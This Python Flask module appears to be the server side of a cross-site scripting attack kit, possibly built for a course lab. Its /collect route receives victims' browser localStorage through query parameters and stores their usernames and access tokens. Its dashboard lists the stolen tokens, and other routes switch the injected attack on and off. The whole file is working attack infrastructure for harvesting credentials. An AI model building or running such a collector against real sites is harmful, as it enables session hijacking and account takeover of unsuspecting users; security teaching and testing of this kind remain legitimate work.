import json
from datetime import datetime

from flask import Blueprint, request, render_template, jsonify, current_app, redirect, url_for
from sqlalchemy.exc import SQLAlchemyError

from . import db
from .attack_utils import run_attack_operation
from .models import CollectedData, AppState

main_bp = Blueprint('main', __name__)

# Constants for state keys
ATTACK_STATE_KEY = "attack_state"


def _parse_local_storage(raw_json):
    try:
        return json.loads(raw_json)
    except (TypeError, json.JSONDecodeError):
        raise ValueError("Invalid JSON in localStorage")


def get_app_state(key, default=None):
    """Get application state value by key."""
    try:
        state = AppState.query.filter_by(key=key).first()
        return state.value if state else default
    except Exception as e:
        current_app.logger.error(f"Error getting app state: {e}")
        return default


def set_app_state(key, value):
    """Set application state value."""
    try:
        state = AppState.query.filter_by(key=key).first()
        now = datetime.now().isoformat()
        
        if state:
            state.value = value
            state.updated_at = now
        else:
            state = AppState(key=key, value=value, updated_at=now)
            db.session.add(state)
            
        db.session.commit()
        return True
    except Exception as e:
        current_app.logger.error(f"Error setting app state: {e}")
        db.session.rollback()
        return False


@main_bp.route('/collect')
def collect():
    """Collect and store client data via query parameters."""
    current_app.logger.info("/collect called with args: %s", request.args)

    dt = request.args.get('dt')
    raw_ls = request.args.get('ls')

    # Basic validations
    if dt != 'elec0138-xss':
        current_app.logger.warning("Invalid data type: %s", dt)
        return jsonify(error="Invalid data type"), 400

    if not raw_ls:
        current_app.logger.warning("Missing localStorage data")
        return jsonify(error="Missing localStorage data"), 400

    try:
        local_storage = _parse_local_storage(raw_ls)
    except ValueError as e:
        current_app.logger.warning(str(e))
        return jsonify(error=str(e)), 400

    new_data = CollectedData(
        timestamp=datetime.now().isoformat(),
        current_user=local_storage.get('currentUser', ''),
        access_token=local_storage.get('access_token', ''),
    )

    try:
        db.session.add(new_data)
        db.session.commit()
        return '', 204
    except SQLAlchemyError:
        current_app.logger.exception("Database error while storing data")
        db.session.rollback()
        return jsonify(error="Database error"), 500


@main_bp.route('/')
def display_data():
    """Render collected data with pagination."""
    page = request.args.get('page', 1, type=int)
    per_page = current_app.config.get('PER_PAGE', 50)
    request_format = request.args.get('format', '')
    is_ajax = request.headers.get('X-Requested-With') == 'XMLHttpRequest'

    try:
        pagination = CollectedData.query.order_by(
            CollectedData.id.desc()
        ).paginate(page=page, per_page=per_page, error_out=False)

        # Get current attack state
        attack_state = get_app_state(ATTACK_STATE_KEY, "inactive")

        # Return JSON for AJAX requests or when format=json is specified
        if is_ajax or request_format == 'json':
            items_data = []
            for item in pagination.items:
                items_data.append({
                    'id': item.id,
                    'timestamp': item.timestamp,
                    'current_user': item.current_user,
                    'access_token': item.access_token
                })
                
            pagination_data = {
                'page': pagination.page,
                'pages': pagination.pages,
                'has_prev': pagination.has_prev,
                'has_next': pagination.has_next,
                'prev_num': pagination.prev_num if pagination.has_prev else None,
                'next_num': pagination.next_num if pagination.has_next else None,
                'total': pagination.total
            }
            
            return jsonify({
                'items': items_data,
                'pagination': pagination_data,
                'attack_state': attack_state
            })
        
        # Return HTML for regular requests
        return render_template(
            'index.html',
            data=pagination.items,
            pagination=pagination,
            now={'year': datetime.now().year},
            attack_state=attack_state
        )

    except SQLAlchemyError:
        current_app.logger.exception("Database error fetching records")
        error_msg = "Database error occurred"
    except Exception as e:
        current_app.logger.exception(f"Unexpected error retrieving data: {e}")
        error_msg = "Error retrieving data"

    # Return appropriate error based on request type
    if is_ajax or request_format == 'json':
        return jsonify({'error': error_msg}), 500
    
    return render_template('index.html', data=[], error=error_msg)


@main_bp.route('/attack/enable', methods=['POST'])
def enable_attack():
    """Enable XSS attack."""
    current_app.logger.info("Enabling XSS attack...")
    result = run_attack_operation("enable")
    
    if result['success']:
        current_app.logger.info("Attack enabled successfully")
        set_app_state(ATTACK_STATE_KEY, "active")
    else:
        current_app.logger.warning(f"Failed to enable attack: {result['message']}")
    
    # For AJAX requests
    if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
        return jsonify(result)
    
    # For regular form submissions
    return redirect(url_for('main.display_data'))


@main_bp.route('/attack/disable', methods=['POST'])
def disable_attack():
    """Disable XSS attack."""
    current_app.logger.info("Disabling XSS attack...")
    result = run_attack_operation("disable")
    
    if result['success']:
        current_app.logger.info("Attack disabled successfully")
        set_app_state(ATTACK_STATE_KEY, "inactive")
    else:
        current_app.logger.warning(f"Failed to disable attack: {result['message']}")
    
    # For AJAX requests
    if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
        return jsonify(result)
    
    # For regular form submissions
    return redirect(url_for('main.display_data'))


@main_bp.route('/attack/state', methods=['GET'])
def get_attack_state():
    """Get current attack state."""
    attack_state = get_app_state(ATTACK_STATE_KEY, "inactive")
    return jsonify({"state": attack_state})
